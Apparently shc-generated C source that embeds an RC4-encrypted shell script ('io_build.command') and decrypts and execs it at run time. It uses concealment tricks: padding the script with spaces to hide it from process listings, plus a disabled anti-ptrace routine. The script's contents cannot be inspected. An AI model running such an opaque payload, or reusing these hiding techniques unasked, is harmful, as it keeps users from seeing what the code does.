#if 0
	shc Version 3.9.6, Generic Shell Script Compiler
	GNU GPL Version 3 Md Jahidul Hamid <jahidulhamid@yahoo.com>

	./shc -v -r -f io_build.command 
#endif

static  char data [] = 
#define      text_z	1481
#define      text	((&data[271]))
	"\155\307\335\206\036\330\143\044\053\127\026\102\253\252\103\164"
	"\012\222\122\114\223\115\273\066\073\230\005\146\171\251\125\334"
	"\102\065\356\015\231\055\344\207\277\374\324\144\122\161\210\352"
	"\076\132\274\156\020\016\373\263\117\214\327\322\265\006\261\317"
	"\325\232\053\147\347\250\226\251\267\340\116\074\321\040\172\276"
	"\276\372\126\220\226\163\140\340\077\375\061\227\153\163\067\235"
	"\151\214\022\361\331\372\351\070\215\046\271\277\214\144\235\005"
	"\107\124\263\157\067\077\325\075\317\156\035\062\355\214\171\263"
	"\374\273\176\066\236\051\356\364\304\362\021\134\217\254\036\353"
	"\023\027\047\115\143\222\342\045\345\160\101\045\366\334\314\210"
	"\067\020\154\163\146\006\044\022\024\374\166\031\256\120\243\265"
	"\315\167\105\322\255\320\322\370\102\105\216\202\324\276\167\122"
	"\070\054\343\237\053\163\065\054\255\036\207\376\016\006\024\221"
	"\101\171\020\220\221\172\163\266\324\242\106\140\135\160\330\017"
	"\361\361\301\335\342\170\125\131\321\223\066\023\016\162\265\115"
	"\337\130\273\202\255\313\110\265\222\177\103\156\251\257\063\126"
	"\355\075\374\373\153\006\246\242\261\167\177\007\067\303\020\277"
	"\172\076\064\312\236\230\275\255\334\204\173\317\265\115\023\061"
	"\276\337\310\147\030\356\311\050\136\026\120\057\061\203\105\204"
	"\366\067\004\077\047\010\272\126\375\247\160\362\215\254\031\161"
	"\260\342\067\361\337\123\045\266\316\014\102\050\151\363\155\212"
	"\074\114\002\340\143\322\366\321\331\136\243\265\220\345\061\136"
	"\221\145\274\251\022\347\220\127\317\123\133\313\044\154\141\353"
	"\115\353\301\011\102\155\050\104\357\030\104\112\120\130\071\054"
	"\261\012\055\345\006\320\347\133\060\316\154\375\314\177\110\217"
	"\354\140\376\273\165\140\205\174\153\067\325\232\365\227\217\044"
	"\020\163\012\015\351\367\335\153\153\141\264\224\360\127\153\354"
	"\020\366\131\121\003\337\024\125\231\321\270\326\307\305\147\321"
	"\142\354\244\010\174\352\062\206\007\057\235\322\247\267\055\246"
	"\322\120\210\316\216\040\272\056\126\245\146\277\000\177\075\374"
	"\267\226\165\176\141\030\223\024\333\325\146\322\026\261\213\025"
	"\336\055\016\075\303\014\374\326\323\351\327\303\143\310\113\044"
	"\160\211\376\114\217\326\266\203\170\253\355\122\326\171\171\066"
	"\210\325\132\156\041\023\145\343\270\375\315\054\277\165\103\021"
	"\160\261\024\247\001\321\361\361\223\200\101\215\122\017\352\015"
	"\066\221\044\162\022\300\242\144\221\274\210\033\232\340\053\253"
	"\331\230\100\313\007\356\031\173\263\264\176\331\177\275\142\256"
	"\133\111\054\246\364\036\033\305\256\035\021\142\355\160\032\301"
	"\324\330\062\252\301\355\101\137\107\114\016\013\027\356\340\042"
	"\035\273\147\000\346\064\300\252\070\317\372\324\025\222\126\057"
	"\330\257\100\217\316\140\132\204\200\043\165\035\323\234\026\345"
	"\206\107\075\225\273\156\356\005\354\265\244\233\200\344\233\154"
	"\023\036\362\220\157\117\037\042\132\166\013\303\144\070\031\054"
	"\221\114\065\353\137\006\001\212\174\075\321\270\047\034\012\237"
	"\036\047\147\013\025\245\261\277\005\102\357\032\030\324\106\160"
	"\303\073\275\312\172\005\017\075\026\036\242\304\012\266\056\026"
	"\265\335\050\204\376\344\044\006\256\065\253\104\270\112\101\132"
	"\310\204\022\071\052\034\332\370\374\067\367\222\133\342\064\367"
	"\147\077\165\221\200\160\031\215\245\026\110\174\215\314\371\136"
	"\375\104\131\144\240\377\117\153\153\141\270\125\016\026\014\151"
	"\343\303\061\222\012\035\264\062\305\351\352\225\267\152\167\207"
	"\371\275\011\342\352\171\176\205\273\303\275\216\061\047\255\302"
	"\217\267\101\342\370\201\245\101\127\260\374\156\306\120\144\347"
	"\047\030\174\217\221\374\024\141\317\160\104\021\275\041\267\362"
	"\366\052\374\214\161\107\320\111\313\022\027\346\043\132\266\014"
	"\234\016\200\221\352\227\164\356\020\144\001\364\071\321\266\275"
	"\050\245\317\344\036\261\351\131\361\204\256\364\127\223\014\160"
	"\144\117\346\337\325\377\163\367\321\260\067\151\221\365\266\002"
	"\220\307\000\363\127\264\114\312\210\274\311\310\020\020\377\217"
	"\370\262\336\267\302\311\041\304\043\102\232\163\201\365\104\033"
	"\371\164\037\311\354\344\224\167\130\350\050\012\143\265\046\050"
	"\244\102\256\102\377\064\275\112\132\044\246\310\355\024\027\346"
	"\157\134\152\164\325\152\362\263\071\215\156\160\344\325\265\330"
	"\336\205\027\230\304\065\043\253\337\360\041\322\321\066\332\060"
	"\256\124\265\242\377\136\247\056\276\104\265\373\203\021\072\317"
	"\211\310\273\230\376\212\276\263\235\363\272\152\252\315\341\017"
	"\114\302\246\124\011\231\015\120\032\100\204\120\161\013\272\160"
	"\070\031\374\121\345\362\321\022\143\130\224\160\306\076\341\057"
	"\126\263\357\103\203\270\266\341\267\115\055\061\123\175\156\332"
	"\012\266\126\036\260\347\205\003\106\063\056\376\055\326\077\100"
	"\341\126\141\126\342\046\226\325\236\224\115\114\060\321\047\255"
	"\001\367\306\366\163\066\124\220\052\073\325\137\356\256\045\305"
	"\050\327\060\004\116\372\143\100\273\160\032\013\111\244\207\010"
	"\332\254\254\002\077\311\340\141\075\347\113\346\032\030\313\020"
	"\364\330\246\177\360\061\322\126\104\247\243\227\360\362\270\333"
	"\143\274\107\031\031\117\022\176\325\265\251\074\333\046\314\100"
	"\055\211\140\052\070\025\311\205\206\106\153\006\141\063\344\076"
	"\146\207\356\171\335\060\200\256\130\064\201\357\040\210\335\236"
	"\270\025\053\336\370\377\134\154\304\030\041\126\167\124\274\211"
	"\271\203\116\210\302\353\260\171\130\214\165\004\333\005\140\152"
	"\347\324\071\337\167\056\352\122\063\256\124\137\316\366\031\000"
	"\146\233\105\104\136\013\127\243\116\333\066\123\114\144\043\347"
	"\005\202\372\024\324\077\135\073\103\036\055\023\023\246\200\371"
	"\355\143\323\147\152\245\145\003\072\220\330\171\301\360\123\261"
	"\134\102\265\025\024\130\037\340\131\040\013\062\356\175\215\040"
	"\261\251\175\154\354\236\203\326\225\337\257\242\114\335\171\177"
	"\163\104\033\031\240\025\333\074\265\053\040\160\343\121\337\315"
	"\376\237\306\000\047\026\022\111\012\206\245\362\141\261\211\135"
	"\152\026\012\111\363\301\103\233\210\203\210\352\176\277\020\310"
	"\271\003\050\353\171\371\325\060\220\026\022\140\106\131\265\156"
	"\353\311\016\113\253\050\370\151\047\352\007\100\271\002\341\374"
	"\101\336\200\275\230\300\303\270\326\132\216\237\136\370\150\003"
	"\355\265\002\251\252\315\106\276\275\330\177\001\007\367\127\221"
	"\030\016\235\352\120\225\235\250\155\246\350\172\166\011\323\340"
	"\215\263\076\315\362\040\155\350\156\106\152\151\322\104\127\076"
	"\266\042\161\124\027\037\156\344\014\350\021\004\114\205\057\153"
	"\214\271\137\343\201\203\144\041\226\004\022\037\030\034\270\314"
	"\374\351\004\337\270\227\076\126\301\130\324\356\164\276\210\374"
	"\035\170\341\357\001\324\134\172\262\113\051\205\133\174\150\325"
	"\111\216\175\317\216\205\157\030\115\105\213\166\020\043\356\134"
	"\113\376\127\134\263\317\045\354\076\312\271\273\125\215\003\207"
	"\216\236\252\271\117\064\061\343\031\147\115\270\217\150\203\115"
	"\150\341\227\052\321\315\005\074\206\051\227\261\276\323\010\133"
	"\021\266\113\115\151\142\336\136\151\102\044\320\114\113\171\321"
	"\157\305\014\204\302\374\250\260\026\033\241\256\327\062\056\240"
	"\374\102\345\261\040\347\005\341\031\304\063\070\253\214\361\367"
	"\211\261\325\013\163\100\070\337\307\152\265\047\231\100\047\275"
	"\366\071\334\277\062\344\205\254\213\107\172\374\246\244\255\201"
	"\234\201\007\335\226\225\256\133\143\050\325\100\366\047\203\010"
	"\340\364\147\277\137\322\160\131\251\002\304\064\047\251\016\214"
	"\216\046\111\374\017\334\304\237\255\044\055\010\115\355\073\125"
	"\000"
#define      rlax_z	1
#define      rlax	((&data[1777]))
	"\064"
#define      date_z	1
#define      date	((&data[1778]))
	"\163"
#define      msg1_z	65
#define      msg1	((&data[1785]))
	"\156\353\127\055\254\250\036\172\223\103\302\201\114\357\274\267"
	"\275\016\111\035\301\145\211\161\054\364\101\031\031\307\212\200"
	"\064\156\243\304\332\074\312\212\043\072\015\060\263\334\006\356"
	"\353\100\104\366\303\140\375\106\002\275\166\123\134\164\141\017"
	"\032\150\174\100\033\374\063\050\332\246\041\114\223\105\201"
#define      inlo_z	3
#define      inlo	((&data[1858]))
	"\161\012\371"
#define      shll_z	10
#define      shll	((&data[1863]))
	"\144\236\145\337\053\377\273\343\262\125\354\145\046\013"
#define      xecc_z	15
#define      xecc	((&data[1878]))
	"\126\217\207\317\137\324\074\352\204\367\247\224\033\063\135\320"
	"\346\152"
#define      msg2_z	19
#define      msg2	((&data[1893]))
	"\262\355\062\077\245\122\335\205\055\315\144\001\370\273\014\160"
	"\374\217\104\215\100"
#define      tst2_z	19
#define      tst2	((&data[1914]))
	"\320\210\120\216\310\171\145\211\032\123\013\301\146\161\277\143"
	"\170\161\203"
#define      opts_z	1
#define      opts	((&data[1933]))
	"\236"
#define      lsto_z	1
#define      lsto	((&data[1934]))
	"\131"
#define      pswd_z	256
#define      pswd	((&data[1942]))
	"\227\307\015\020\324\116\027\215\174\341\134\012\260\011\376\132"
	"\333\067\373\212\235\302\212\252\323\312\073\263\324\005\221\141"
	"\254\045\035\150\025\031\147\123\215\323\075\137\152\175\211\265"
	"\050\043\133\027\115\273\123\007\141\171\263\067\177\076\115\133"
	"\175\374\053\120\251\236\114\214\171\374\243\354\072\344\321\330"
	"\106\132\037\252\367\147\371\223\217\353\264\034\352\265\342\304"
	"\232\126\024\063\372\063\207\133\022\310\230\307\255\372\371\060"
	"\345\022\016\230\152\354\200\040\306\324\035\115\374\271\134\033"
	"\242\103\346\072\146\215\035\240\062\102\270\137\057\306\007\026"
	"\106\237\030\366\333\352\126\066\064\360\003\224\234\360\277\036"
	"\355\302\155\030\367\311\161\233\040\023\351\040\232\044\102\272"
	"\342\235\072\245\256\311\200\167\246\166\106\123\371\261\302\360"
	"\251\143\352\167\162\106\100\277\306\160\274\132\102\246\366\231"
	"\050\245\044\375\264\340\217\123\220\210\173\076\150\363\163\372"
	"\107\055\311\362\251\306\172\210\105\347\305\041\351\102\051\333"
	"\362\243\136\347\211\311\062\252\154\143\001\271\323\370\162\260"
	"\201\267\014\234\155\037\127\077\227\142\107\111\153"
#define      tst1_z	22
#define      tst1	((&data[2209]))
	"\174\104\336\163\300\142\041\102\116\150\022\012\271\147\216\354"
	"\161\061\241\140\170\317\367\357\157\340\130\140"
#define      chk1_z	22
#define      chk1	((&data[2235]))
	"\114\040\117\213\027\023\140\102\142\153\242\347\054\100\355\055"
	"\215\144\106\170\040\240\105\227\336\244\337\161\212\251"
#define      chk2_z	19
#define      chk2	((&data[2266]))
	"\110\331\220\220\033\065\065\265\140\172\316\342\356\154\373\006"
	"\130\315\346\062\315\157\017\321\107\224"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
#define BUSYBOXON	0	/* Define as 1 to enable work with busybox */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		/* Prepend hide_z spaces to script text to hide it. */
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		/* My own name at execution */
#endif
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
